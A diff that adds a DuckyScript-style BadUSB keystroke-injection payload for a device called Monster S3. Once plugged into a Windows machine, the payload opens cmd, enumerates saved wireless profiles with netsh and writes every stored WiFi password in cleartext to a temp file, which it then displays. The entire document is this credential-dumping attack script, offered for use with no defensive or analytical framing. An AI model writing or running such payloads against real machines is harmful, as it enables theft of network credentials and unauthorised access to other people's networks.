@@ -1,0 +1,24 @@
+REM Monster S3 BadUSB - WiFi Credential Dump
+REM This script runs on Windows and extracts saved WiFi passwords
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 200
+ENTER
+DELAY 1000
+STRING netsh wlan show profiles > %TEMP%\wifi.txt
+ENTER
+DELAY 500
+STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| find "Profile"') do echo %a >> %TEMP%\networks.txt
+ENTER
+DELAY 2000
+STRING for /f "tokens=*" %i in (%TEMP%\networks.txt) do netsh wlan show profile name="%i" key=clear >> %TEMP%\wifi.txt
+ENTER
+DELAY 5000
+STRING type %TEMP%\wifi.txt
+ENTER
+DELAY 1000
+STRING exit
+ENTER
